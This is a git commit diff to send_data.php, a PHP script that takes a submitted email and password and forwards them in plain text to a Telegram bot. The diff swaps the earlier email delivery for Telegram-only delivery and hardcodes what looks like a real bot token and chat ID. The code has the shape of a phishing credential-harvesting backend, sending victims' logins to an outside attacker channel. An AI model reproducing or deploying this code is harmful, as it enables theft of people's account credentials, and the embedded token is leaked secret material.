2e58f22ddb2da81393d67adcd9aa3945a381374b
ketlller <oculusvrdk2@gmail.com>
2024-08-21 03:03:20 +0300

    Update send_data.php

--- send_data.php
+++ send_data.php
@@ -1,26 +1,17 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $login = $_POST['login'];
+    $email = $_POST['email'];
     $password = $_POST['password'];
 
-    // Отправка данных на почту
-    $to = 'your-email@example.com';  // Замените на ваш email
-    $subject = 'Новый логин и пароль';
-    $message = "Логин: $login\nПароль: $password";
-    $headers = 'From: noreply@yourdomain.com' . "\r\n" .
-               'Reply-To: noreply@yourdomain.com' . "\r\n" .
-               'X-Mailer: PHP/' . phpversion();
+    // Ваши данные для Telegram
+    $telegram_token = '7433120316:AAGDpLKMuRQz7eLuHlf-Rsd13Y3m9-qyLnw';  // Замените на ваш токен бота
+    $telegram_chat_id = '278006495';  // Замените на ваш ID чата
 
-    mail($to, $subject, $message, $headers);
-
-    // Отправка данных в Telegram
-    $telegram_token = 'your-telegram-bot-token';  // Замените на ваш токен бота
-    $telegram_chat_id = 'your-chat-id';  // Замените на ваш ID чата
-
-    $telegram_message = "Логин: $login\nПароль: $password";
+    $telegram_message = "Логин: $email\nПароль: $password";
 
     $url = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($telegram_message);
 
+    // Отправка запроса в Telegram API
     file_get_contents($url);
 
     // Перенаправление на страницу успеха
